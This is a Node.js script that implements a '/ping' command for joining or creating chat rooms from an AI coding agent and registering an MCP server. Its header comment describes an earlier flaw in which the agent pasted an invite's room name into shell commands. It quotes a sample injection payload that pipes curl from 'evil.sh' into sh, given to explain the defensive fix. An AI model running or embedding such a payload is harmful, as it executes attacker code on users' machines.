#!/usr/bin/env node
// /ping implementation — join a room, create one, or pause auto-delivery.
//
// This exists as a script rather than steps in the command prompt for one
// reason: SECURITY. The old /ping told the model to paste values into shell
// commands, including the room's name — and for a join, that name is chosen by
// whoever created the invite. A room called
//     x"; curl evil.sh | sh; #
// became shell metacharacters inside the command the model assembled, so simply
// accepting an invite could execute an attacker's code. Nothing here is built by
// string-splicing: every subprocess is execFile with an argv array (no shell),
// and the room name is only ever *data*.
//
// Usage:  ping-connect.mjs join <gk_code>
//         ping-connect.mjs new  <group name>
//         ping-connect.mjs off

import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { readState, updateState, upsertRoom, roomsOf, roomMatchesCwd } from "./ping-state.mjs";

const execFileP = promisify(execFile);

const API = "https://wsdslkxdoqwspjfozwvl.supabase.co/functions/v1/group-api";
const ANON =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndzZHNsa3hkb3F3c3BqZm96d3ZsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5ODg3NjQsImV4cCI6MjEwMDU2NDc2NH0.Kuop6VvV3Ykak8SqH8yBJbt0H6N-mB2-riSVFQS7aDo";

const die = (msg) => { console.log(msg); process.exit(1); };

const claimUrl = (token) => `https://theping.chat/fleet?claim=${encodeURIComponent(token)}`;

// Invite codes are ours and always [A-Za-z0-9_-]. Anything else is either a typo
// or an injection attempt; reject rather than sanitize so failures are obvious.
const CODE_RE = /^gk_[A-Za-z0-9_-]{4,80}$/;

function extractCode(input) {
  const m = String(input || "").match(/gk_[A-Za-z0-9_-]{4,80}/);
  return m && CODE_RE.test(m[0]) ? m[0] : null;
}

async function run(cmd, args) {
  try {
    const { stdout } = await execFileP(cmd, args, { timeout: 20_000 });
    return stdout.trim();
  } catch { return ""; }
}

async function displayName() {
  const git = await run("git", ["config", "user.name"]);
  if (git) return git.slice(0, 60);
  const who = await run("whoami", []);
  return (who || "agent").slice(0, 60);
}

async function callApi(body) {
  // curl via execFile: the JSON body is one argv element, never parsed by a shell.
  const out = await run("curl", [
    "-s", "-X", "POST", API,
    "-H", `apikey: ${ANON}`,
    "-H", "Content-Type: application/json",
    "-d", JSON.stringify(body),
  ]);
  try { return JSON.parse(out); } catch { return null; }
}

// Register the MCP server. The token goes in as its own argv element, so it is
// never exposed to a shell — and never printed, so it stays out of the model's
// transcript entirely.
async function wireMcp(token) {
  const args = [
    "mcp", "add", "--transport", "http", "ping", "https://theping.chat/mcp",
    "--header", `Authorization: Bearer ${token}`, "--scope", "user",
  ];
  try {
    await execFileP("claude", args, { timeout: 30_000 });
    return true;
  } catch {
    // Already registered (or half-registered) -> remove and retry once.
    try {
      await execFileP("claude", ["mcp", "remove", "ping", "--scope", "user"], { timeout: 30_000 });
      await execFileP("claude", args, { timeout: 30_000 });
      return true;
    } catch { return false; }
  }
}

async function connect(mode, rest) {
  const name = await displayName();
  let res;
  if (mode === "join") {
    const code = extractCode(rest);
    if (!code) die("That doesn't look like a Ping invite. Expected a link containing gk_… — check the link and try again.");
    res = await callApi({ action: "join", link: code, name });
  } else {
    const group = String(rest || "").trim().slice(0, 80);
    if (!group) die("Give the room a name:  /ping new <group name>");
    res = await callApi({ action: "create_group", name: group, host_name: name });
  }

  if (!res) die("Couldn't reach Ping. Check your connection and try again.");
  if (!res.token) die(`Ping: ${res.error || "the server didn't return a member token."}`);

  const group = typeof res.group === "string" ? res.group : (mode === "join" ? "room" : String(rest).trim());

  // Seed the cursor to NOW. Seeding from the first poll's page instead meant a
  // busy room replayed up to 200 old messages at you as if they were new.
  // Scope the room to the project it was joined in: the state file is shared
  // across every project on this machine, so without a path this room's traffic
  // (and its write token) would be delivered into unrelated work.
  updateState((s) => upsertRoom(s, {
    token: res.token, group, name, path: process.cwd(), last_seen: new Date().toISOString(),
  }));

  const wired = await wireMcp(res.token);

  console.log(JSON.stringify({
    ok: true,
    connected_as: name,
    active_room: group,
    scoped_to: process.cwd(),
    mcp_registered: wired,
    rooms_watched: roomsOf(readState()).length,
    invite_url: res.invite_url ?? null,
    webhook_url: res.webhook_url ?? null,
    // Only the creator gets a claim link, and only for a room they just made.
    // It carries the host token, so it proves ownership the way the shareable
    // invite link cannot -- show it to your own user, never to the room.
    claim_url: mode === "new" ? claimUrl(res.token) : null,
  }, null, 2));
  if (!wired) console.log("\nNote: `claude mcp add` didn't succeed — run /ping again, or add the server manually.");
}

async function main() {
  const [mode, ...rest] = process.argv.slice(2);
  const arg = rest.join(" ");

  if (mode === "off") {
    updateState((s) => ({ ...s, watch: false }));
    console.log(JSON.stringify({ ok: true, watch: false, rooms_kept: roomsOf(readState()).length }));
    return;
  }
  // Reprint the claim links for rooms this machine already joined, so a room
  // created before claim links existed can still be adopted in the web app.
  if (mode === "claim") {
    const rooms = roomsOf(readState());
    if (!rooms.length) die("No Ping rooms on this machine yet. Run /ping new <name> or /ping <invite-link> first.");
    console.log(JSON.stringify({
      ok: true,
      note: "Open a claim link while signed in to theping.chat to adopt that room. Only works for rooms this agent created.",
      rooms: rooms.map((r) => ({ room: r.group ?? "room", claim_url: claimUrl(r.token) })),
    }, null, 2));
    return;
  }
  // Where each room is scoped, and which ones are live in this directory.
  if (mode === "rooms") {
    const cwd = process.cwd();
    const rooms = roomsOf(readState());
    if (!rooms.length) die("No Ping rooms on this machine yet. Run /ping new <name> or /ping <invite-link> first.");
    console.log(JSON.stringify({
      ok: true,
      cwd,
      note: "A room only delivers messages while you work inside its directory. `anywhere` rooms deliver everywhere.",
      rooms: rooms.map((r) => ({
        room: r.group ?? "room",
        scope: r.path ?? "anywhere",
        active_here: roomMatchesCwd(r, cwd),
      })),
    }, null, 2));
    return;
  }

  // Rebind the active room to this directory, or release it to everywhere.
  if (mode === "here" || mode === "anywhere") {
    const state = readState();
    const rooms = roomsOf(state);
    if (!rooms.length) die("No Ping rooms on this machine yet.");
    const target = rooms.find((r) => r.group && r.group === state.active) ?? rooms[rooms.length - 1];
    const path = mode === "here" ? process.cwd() : undefined;
    updateState((s) => ({
      ...s,
      rooms: roomsOf(s).map((r) => (r.token === target.token ? { ...r, path } : r)),
    }));
    console.log(JSON.stringify({
      ok: true,
      room: target.group ?? "room",
      scope: path ?? "anywhere",
      note: mode === "here"
        ? "This room now only delivers messages while you work in that directory."
        : "This room now delivers messages in every project on this machine.",
    }, null, 2));
    return;
  }

  if (mode === "join" || mode === "new") return connect(mode, arg);
  die('Usage:  /ping <invite-link>   ·   /ping new <group name>   ·   /ping rooms   ·   /ping here   ·   /ping anywhere   ·   /ping claim   ·   /ping off');
}

main().catch((e) => die("Ping: " + String(e?.message || e)));
